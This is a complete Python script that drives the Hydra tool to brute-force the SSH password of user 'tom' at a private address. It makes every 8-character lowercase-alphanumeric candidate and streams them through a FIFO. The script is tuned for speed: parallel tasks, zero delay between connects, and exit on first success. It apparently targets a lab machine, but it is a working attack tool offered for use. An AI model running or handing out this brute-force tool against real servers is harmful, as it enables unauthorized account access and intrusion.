import subprocess
import os
import time
import signal
import sys
import itertools
import threading
from datetime import datetime

# ================= CONFIG =================
TARGET = "ssh://10.0.1.121"
USERNAME = "tom"
MIN_LEN = 8
MAX_LEN = 8
CHARSET = "abcdefghijklmnopqrstuvwxyz0123456789"  # 36 chars
PREFIX = ""
SUFFIX = ""
TASKS = 16                   # ↑↑↑ Try higher (16–64) if this is your lab machine
VERBOSE_HYDRA = "-vV"        # More detailed output from Hydra itself
RATE_LIMIT_SEC = 0.0         # Usually 0; only add delay if server bans you
PROGRESS_INTERVAL_GEN = 5000     # Log generation every N candidates
PROGRESS_INTERVAL_STATUS = 30    # Overall status every N seconds
FIFO_PATH = "/tmp/hydra_fifo"

# Hydra speed tuning flags (add aggressive timeouts/zero delays)
HYDRA_EXTRA_FLAGS = ["-w", "8", "-W", "0"]  # max wait 8s, no delay between connects

start_time = time.time()
candidates_generated = 0
attempts_made_estimate = 0      # We'll increment based on time/tasks (rough)
lock = threading.Lock()

def log(msg, level="INFO"):
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print(f"[{ts}] [{level}] {msg}", flush=True)

def generate_passwords(min_len, max_len, charset, prefix, suffix):
    global candidates_generated
    for length in range(min_len, max_len + 1):
#        log(f"Generating length {length} ({len(charset):,}^{length} = {len(charset)**length:,} combos)")
        count_this_len = 0
        for combo in itertools.product(charset, repeat=length):
            pwd = prefix + "".join(combo) + suffix
            yield pwd
            with lock:
                candidates_generated += 1
                count_this_len += 1
            if candidates_generated % PROGRESS_INTERVAL_GEN == 0:
                elapsed = time.time() - start_time
                gen_rate = candidates_generated / elapsed if elapsed > 0 else 0
#                log(f"GENERATED {candidates_generated:,} total | "
#                    f"len {length}: {count_this_len:,} | "
#                    f"gen rate ~{gen_rate:,.1f}/s | elapsed {elapsed:.1f}s")

def writer_thread(fifo_write, generator):
    log("Writer thread active — feeding Hydra")
    try:
        for pwd in generator:
            try:
                fifo_write.write(pwd + "\n")
                fifo_write.flush()
                if RATE_LIMIT_SEC > 0:
                    time.sleep(RATE_LIMIT_SEC)
            except BrokenPipeError:
                log("Broken pipe: Hydra closed FIFO (likely found password or errored)", "WARN")
                return
            except Exception as e:
                log(f"Write failed: {e}", "ERROR")
                return
    finally:
        fifo_write.close()
        log("Writer closed FIFO")

def status_thread():
    global attempts_made_estimate
    while True:
        time.sleep(PROGRESS_INTERVAL_STATUS)
        with lock:
            elapsed = time.time() - start_time
            if elapsed < 1: continue
            gen_rate = candidates_generated / elapsed
            # Rough estimate: Hydra tries ≈ tasks * (1 / avg RTT per attempt)
            # But for display we use generated as proxy unless Hydra gives better
            log(f"STATUS | gen: {candidates_generated:,} (~{gen_rate:,.1f}/s) | "
                f"elapsed: {elapsed:.1f}s | "
                f"~attempts made (est): {int(elapsed * TASKS * 4):,} "
                f"(very rough; watch Hydra output for real progress)")

def main():
    global start_time
    start_time = time.time()
    log("=== Streaming SSH brute-force (Hydra + Python generator) ===")
    log(f"Target      : {TARGET}")
    log(f"User        : {USERNAME}")
    log(f"Length      : {MIN_LEN}–{MAX_LEN}")
    log(f"Charset     : {CHARSET} ({len(CHARSET)} chars → {len(CHARSET)**(MAX_LEN):,} total)")
    log(f"Tasks       : {TASKS}   Verbose: {VERBOSE_HYDRA or 'quiet'}")
    log(f"Extra flags : {' '.join(HYDRA_EXTRA_FLAGS)}")
    log(f"Rate limit  : {RATE_LIMIT_SEC}s")
    log("-" * 70)

    if os.path.exists(FIFO_PATH):
        os.unlink(FIFO_PATH)
    os.mkfifo(FIFO_PATH)
    log(f"FIFO created: {FIFO_PATH}")

    try:
        # Build Hydra command
        hydra_cmd = [
            "hydra",
            "-l", USERNAME,
            "-P", FIFO_PATH,
            "-t", str(TASKS),
            VERBOSE_HYDRA,
            *HYDRA_EXTRA_FLAGS,
            "-f",  # exit on first success
            TARGET
        ]
        log(f"Hydra cmd: {' '.join(hydra_cmd)}")
        hydra_proc = subprocess.Popen(hydra_cmd, stdout=sys.stdout, stderr=sys.stderr)
        log(f"Hydra launched — PID {hydra_proc.pid}")

        time.sleep(1.5)  # Give Hydra time to open FIFO

        gen = generate_passwords(MIN_LEN, MAX_LEN, CHARSET, PREFIX, SUFFIX)
        writer = threading.Thread(target=writer_thread, args=(open(FIFO_PATH, "w"), gen), daemon=True)
        writer.start()

        status = threading.Thread(target=status_thread, daemon=True)
        status.start()

        log("All threads running — watching Hydra output above for real attempts...")
        hydra_proc.wait()

        elapsed = time.time() - start_time
        log(f"Hydra exited (rc={hydra_proc.returncode}) after {elapsed:.1f}s")
        log(f"Generated: {candidates_generated:,}")
        log(f"If password was found → check Hydra output above for the line like:")
        log("  [22][ssh] host: ...   login: tom   password: THEPASSWORD")

    except KeyboardInterrupt:
        log("Ctrl+C — shutting down", "WARN")
    except Exception as e:
        log(f"Main error: {e}", "ERROR")
    finally:
        log("Cleanup starting...")
        if 'hydra_proc' in locals() and hydra_proc.poll() is None:
            hydra_proc.terminate()
            try:
                hydra_proc.wait(8)
            except:
                hydra_proc.kill()
                log("Hydra killed (did not terminate cleanly)")

        if 'writer' in locals() and writer.is_alive():
            writer.join(3)

        if os.path.exists(FIFO_PATH):
            try:
                os.unlink(FIFO_PATH)
            except:
                pass
        log("Cleanup done.")

if __name__ == "__main__":
    main()